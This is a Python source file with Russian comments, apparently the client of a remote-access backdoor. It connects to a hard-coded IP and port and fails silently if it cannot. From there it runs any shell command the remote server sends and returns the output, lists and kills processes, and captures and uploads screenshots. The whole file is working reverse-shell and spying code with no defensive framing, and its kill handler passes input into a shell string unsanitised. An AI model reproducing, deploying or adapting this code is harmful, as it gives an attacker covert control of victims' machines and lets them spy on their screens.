import socket
import subprocess
import os

SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        return output
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((SERVER_IP, SERVER_PORT))
    except Exception as e:
        # При неудачном подключении - просто завершить программу (тихо)
        return

    try:
        while True:
            data = s.recv(BUFFER_SIZE).decode(errors='ignore')
            if not data:
                break
            if data == "exit":
                break
            if data.startswith("cmd:"):
                cmd = data[4:]
                output = execute_command(cmd)
                s.send(output.encode(errors='ignore'))
            elif data == "process_list":
                if os.name == 'nt':
                    procs = subprocess.getoutput('tasklist')
                else:
                    procs = subprocess.getoutput('ps aux')
                s.send(procs.encode(errors='ignore'))
            elif data.startswith("kill:"):
                pid = data[5:]
                try:
                    if os.name == 'nt':
                        subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                    else:
                        subprocess.check_output(f'kill -9 {pid}', shell=True)
                    s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
                except Exception as e:
                    s.send(f"Ошибка: {e}".encode(errors='ignore'))
            elif data == "screenshot":
                try:
                    import pyautogui
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screen.jpg")
                    with open("screen.jpg", "rb") as f:
                        while True:
                            chunk = f.read(BUFFER_SIZE)
                            if not chunk:
                                break
                            s.sendall(chunk)
                    os.remove("screen.jpg")
                except Exception as e:
                    s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))
            else:
                s.send("Неизвестная команда".encode(errors='ignore'))
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    main()
